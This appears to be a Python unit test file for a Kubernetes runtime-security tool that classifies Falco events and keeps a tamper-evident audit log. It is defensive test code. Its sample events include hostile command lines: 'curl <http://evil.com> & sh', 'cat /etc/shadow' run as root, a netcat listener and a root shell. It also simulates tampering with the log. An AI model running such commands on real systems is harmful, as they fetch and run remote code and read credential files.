"""Unit tests for minimal vertical slice: normalization -> classification -> policy -> audit log."""

from __future__ import annotations

import json
from pathlib import Path
from tempfile import NamedTemporaryFile

from runtimelens.audit.writer import AuditWriter
from runtimelens.collector.webhook import process_falco_payload
from runtimelens.sanitizer import escape_state_delimiters


def test_vertical_slice_benign_event() -> None:
    raw_event = {
        "output": "18:00:00: Routine web process started",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "k8s.pod.name": "web-74b88dfd9b-w6tl9",
            "k8s.pod.uid": "uid-web-01",
            "container.name": "web",
            "container.id": "c1234567890a",
            "container.image.repository": "alpine",
            "container.image.tag": "3.19",
            "proc.cmdline": "nc -l -p 8080",
            "proc.name": "nc",
            "user.name": "appuser",
            "user.uid": 10001,
        },
        "rule": "Process Execution",
        "time": "2026-10-17T18:00:00.000000Z",
    }

    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        record = process_falco_payload(raw_event, writer, dry_run=True)

        assert record.classification.predicted_class == "benign"
        assert record.decision.action == "log"
        assert record.prev_record_hash == "0" * 64
        assert len(record.record_hash) == 64

        # Verify file contents
        is_valid, count, err = AuditWriter.verify_chain(log_path)
        assert is_valid, f"Verification failed: {err}"
        assert count == 1
    finally:
        if log_path.exists():
            log_path.unlink()


def test_vertical_slice_unexpected_shell_privilege_abuse() -> None:
    raw_event = {
        "output": "18:01:00: Interactive shell spawned in tenant container",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "k8s.pod.name": "web-74b88dfd9b-w6tl9",
            "k8s.pod.uid": "uid-web-01",
            "container.name": "web",
            "container.id": "c1234567890a",
            "container.image.repository": "alpine",
            "container.image.tag": "3.19",
            "proc.cmdline": "/bin/sh",
            "proc.name": "sh",
            "user.name": "root",
            "user.uid": 0,
        },
        "rule": "Interactive Shell Spawned in Non-Debug Container",
        "time": "2026-10-17T18:01:00.000000Z",
    }

    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        record = process_falco_payload(raw_event, writer, dry_run=True)

        assert record.classification.predicted_class == "privilege_abuse"
        assert record.decision.action == "alert"
        assert "unexpected_shell_execution" in record.event.baseline.deviations

        is_valid, count, err = AuditWriter.verify_chain(log_path)
        assert is_valid
        assert count == 1
    finally:
        if log_path.exists():
            log_path.unlink()


def test_pod_without_host_mounts_never_produces_host_mount_facts() -> None:
    """Prove that a plain read of /etc/shadow in a tenant pod never claims host mounts."""
    raw_event = {
        "output": "Warning Sensitive identity file opened for read",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "k8s.pod.name": "web-6794787bc8-4wmx6",
            "k8s.pod.uid": "uid-web-01",
            "container.name": "web",
            "container.id": "c1234567890a",
            "container.image.repository": "docker.io/library/alpine",
            "container.image.tag": "3.19",
            "proc.cmdline": "cat /etc/shadow",
            "fd.name": "/etc/shadow",
            "proc.name": "cat",
            "user.name": "root",
            "user.uid": 0,
        },
        "rule": "Read Sensitive Host Information Untrusted",
        "time": "2026-10-18T00:00:00Z",
    }

    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        record = process_falco_payload(raw_event, writer, dry_run=True)

        # Invariant: A tenant workload with no host mounts MUST NOT report host mounts
        assert record.event.facts.host_runtime_socket_mounted is False
        assert record.event.facts.sensitive_host_path_mounted is False
        assert "OVERRIDE_HOST_PATH_MOUNTED" not in record.decision.reason_codes

        # Correct classification for unconfirmed reconnaissance is benign (severity 2.0 / low)
        assert record.classification.predicted_class == "benign"
        assert record.classification.severity == 2.0
        assert "sensitive_identity_file_access" in record.event.baseline.deviations

        # Low-severity identity-read alert fires before benign log
        assert record.decision.action == "alert"
        assert record.decision.reason_codes == ["LOW_SEVERITY_IDENTITY_READ_ALERT"]

        # Image digest contains real sha256, not raw tag
        assert "@sha256:" in record.event.workload.image_digest
    finally:
        if log_path.exists():
            log_path.unlink()


def test_pod_spec_host_mount_derivation() -> None:
    """Verify that host-mount facts derive strictly from pod spec, not from pod name."""
    from runtimelens.normalizer.falco import normalize_falco_event

    raw_event = {
        "output": "Test event",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "k8s.pod.name": "custom-workload-pod",
            "proc.cmdline": "test",
            "time": "2026-10-18T00:00:00Z",
        },
    }

    # Case A: Pod with dummy host socket mount
    pod_spec_with_socket = {
        "volumes": [{"name": "docker-sock", "hostPath": {"path": "/var/run/docker.sock"}}]
    }
    event_sock = normalize_falco_event(raw_event, pod_spec=pod_spec_with_socket)
    assert event_sock.facts.host_runtime_socket_mounted is True
    assert event_sock.facts.sensitive_host_path_mounted is False

    # Case B: Pod with dummy host path mount (/etc/kubernetes)
    pod_spec_with_path = {
        "volumes": [{"name": "k8s-conf", "hostPath": {"path": "/etc/kubernetes"}}]
    }
    event_path = normalize_falco_event(raw_event, pod_spec=pod_spec_with_path)
    assert event_path.facts.host_runtime_socket_mounted is False
    assert event_path.facts.sensitive_host_path_mounted is True

    # Case C: Pod with emptyDir volume (no host mounts)
    pod_spec_no_host = {"volumes": [{"name": "tmp", "emptyDir": {}}]}
    event_no_host = normalize_falco_event(raw_event, pod_spec=pod_spec_no_host)
    assert event_no_host.facts.host_runtime_socket_mounted is False
    assert event_no_host.facts.sensitive_host_path_mounted is False


def test_command_args_unescaped_in_event_and_escaped_for_model() -> None:
    """Assert canonical event stores raw unescaped text; escaping is deferred to model."""
    raw_event = {
        "output": "Test command with delimiters",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "k8s.pod.name": "web-test-01",
            "proc.cmdline": "curl <http://evil.com> & sh",
            "time": "2026-10-18T00:00:00Z",
        },
    }

    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        record = process_falco_payload(raw_event, writer, dry_run=True)

        # Canonical event stores raw unescaped characters
        raw_stored: str = (
            record.event.runtime.command_args_sanitized
            if record.event.runtime and record.event.runtime.command_args_sanitized
            else ""
        )
        assert "<" in raw_stored
        assert ">" in raw_stored
        assert "&lt;" not in raw_stored

        # Model serialization escapes delimiters
        escaped_for_model = escape_state_delimiters(raw_stored)
        assert "<" not in escaped_for_model
        assert "&lt;" in escaped_for_model
    finally:
        if log_path.exists():
            log_path.unlink()


def test_audit_hash_chain_truncation_detection() -> None:
    """Build a 5-record chain, truncate last records, and assert truncation is detected."""
    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        last_hash = ""
        for i in range(5):
            raw = {
                "output": f"Event {i}",
                "output_fields": {"k8s.ns.name": "tenant-a", "proc.cmdline": f"worker {i}"},
                "time": f"2026-10-18T00:0{i}:00Z",
            }
            rec = process_falco_payload(raw, writer, dry_run=True)
            last_hash = rec.record_hash

        # Anchor head hash outside the log file
        anchored_head_hash = last_hash

        # Verify full clean chain against anchored head hash
        is_v, count, err = AuditWriter.verify_chain_against_head(log_path, anchored_head_hash)
        assert is_v
        assert count == 5
        assert err is None

        # Attacker truncates the log file to only 3 records (drops records 3 and 4)
        lines = log_path.read_text(encoding="utf-8").splitlines()
        truncated_lines = lines[:3]
        log_path.write_text("\n".join(truncated_lines) + "\n", encoding="utf-8")

        # Isolated chain verify without external anchor would succeed because prefix is valid
        is_v_isolated, count_isolated, _ = AuditWriter.verify_chain(log_path)
        assert is_v_isolated is True
        assert count_isolated == 3

        # BUT verification against the external anchored head hash detects truncation!
        is_v_anchored, count_anchored, err_anchored = AuditWriter.verify_chain_against_head(
            log_path, anchored_head_hash
        )
        assert is_v_anchored is False
        assert "Truncation detected" in str(err_anchored)
    finally:
        if log_path.exists():
            log_path.unlink()


def test_audit_hash_chain_tamper_detection() -> None:
    with NamedTemporaryFile(suffix=".jsonl", delete=False) as f:
        log_path = Path(f.name)

    try:
        writer = AuditWriter(log_path)
        for i in range(2):
            raw = {
                "output": f"Event {i}",
                "output_fields": {"k8s.ns.name": "tenant-a", "proc.cmdline": f"echo {i}"},
                "time": f"2026-10-17T18:0{i}:00Z",
            }
            process_falco_payload(raw, writer, dry_run=True)

        is_valid, count, err = AuditWriter.verify_chain(log_path)
        assert is_valid
        assert count == 2

        # Tamper with the first line in the file
        lines = log_path.read_text(encoding="utf-8").splitlines()
        tampered_first = json.loads(lines[0])
        tampered_first["classification"]["predicted_class"] = "container_escape"
        lines[0] = json.dumps(tampered_first)
        log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

        # Verify that tamper-evidence detection flags the forgery
        is_valid, count, err = AuditWriter.verify_chain(log_path)
        assert not is_valid
        assert "Hash mismatch at record 0" in str(err)
    finally:
        if log_path.exists():
            log_path.unlink()


def test_policy_confidence_none_bypasses_gate() -> None:
    """Prove confidence=None does not trigger LOW_CONFIDENCE_GATE and evaluates threat class."""
    from runtimelens.models.decision import ClassificationResult
    from runtimelens.normalizer.falco import normalize_falco_event
    from runtimelens.policy.engine import evaluate_policy

    raw_event = {
        "output": "Test shell execution",
        "output_fields": {"k8s.ns.name": "tenant-a", "proc.cmdline": "/bin/sh"},
        "time": "2026-10-18T00:00:00Z",
    }
    event = normalize_falco_event(raw_event)
    classification = ClassificationResult(
        predicted_class="privilege_abuse",
        severity=3.8,
        confidence=None,  # Rule heuristic (None)
        classifier_type="rules",
        model_version="rules_context_v1",
        evidence_flags={"baseline_deviation": 1.0, "shell_unexpected": 1.0},
    )
    decision = evaluate_policy(classification, event, dry_run=True)
    assert decision.action == "alert"
    assert "LOW_CONFIDENCE_GATE" not in decision.reason_codes


def test_policy_identity_read_alert_order() -> None:
    """Prove identity-read alert fires for benign classification before the log-only action."""
    from runtimelens.models.decision import ClassificationResult
    from runtimelens.normalizer.falco import normalize_falco_event
    from runtimelens.policy.engine import evaluate_policy

    raw_event = {
        "output": "Test identity file read",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "proc.cmdline": "cat /etc/shadow",
            "fd.name": "/etc/shadow",
        },
        "time": "2026-10-18T00:00:00Z",
    }
    event = normalize_falco_event(raw_event)
    assert "sensitive_identity_file_access" in event.baseline.deviations

    classification = ClassificationResult(
        predicted_class="benign",
        severity=2.0,
        confidence=None,
        classifier_type="rules",
        model_version="rules_context_v1",
    )
    decision = evaluate_policy(classification, event, dry_run=True)
    assert decision.action == "alert"
    assert decision.reason_codes == ["LOW_SEVERITY_IDENTITY_READ_ALERT"]


def test_policy_baseline_in_scope_and_identity_read_alert() -> None:
    """Prove baseline is in scope and directly drives the identity-read alert."""
    from runtimelens.models.decision import ClassificationResult
    from runtimelens.normalizer.falco import normalize_falco_event
    from runtimelens.policy.engine import evaluate_policy

    raw_event = {
        "output": "Test baseline in scope",
        "output_fields": {
            "k8s.ns.name": "tenant-a",
            "proc.cmdline": "cat /etc/shadow",
            "fd.name": "/etc/shadow",
        },
        "time": "2026-10-18T00:00:00Z",
    }
    event = normalize_falco_event(raw_event)
    classification = ClassificationResult(
        predicted_class="benign",
        severity=2.0,
        confidence=None,
        classifier_type="rules",
        model_version="rules_context_v1",
    )
    # If baseline is in scope, it must evaluate event.baseline.deviations and trigger alert
    decision = evaluate_policy(classification, event, dry_run=True)
    assert decision.action == "alert"
    assert "LOW_SEVERITY_IDENTITY_READ_ALERT" in decision.reason_codes


def test_policy_rules_benign_with_none_confidence_logs() -> None:
    """Prove benign rule output with confidence=None logs normally without routing to review."""
    from runtimelens.models.decision import ClassificationResult
    from runtimelens.normalizer.falco import normalize_falco_event
    from runtimelens.policy.engine import evaluate_policy

    raw_event = {
        "output": "Test benign operation",
        "output_fields": {"k8s.ns.name": "tenant-a", "proc.cmdline": "nc -l 8080"},
        "time": "2026-10-18T00:00:00Z",
    }
    event = normalize_falco_event(raw_event)
    event.baseline.deviations = []  # No deviations

    classification = ClassificationResult(
        predicted_class="benign",
        severity=1.0,
        confidence=None,
        classifier_type="rules",
        model_version="rules_context_v1",
    )
    decision = evaluate_policy(classification, event, dry_run=True)
    assert decision.action == "log"
    assert decision.reason_codes == ["BENIGN_VERIFIED"]
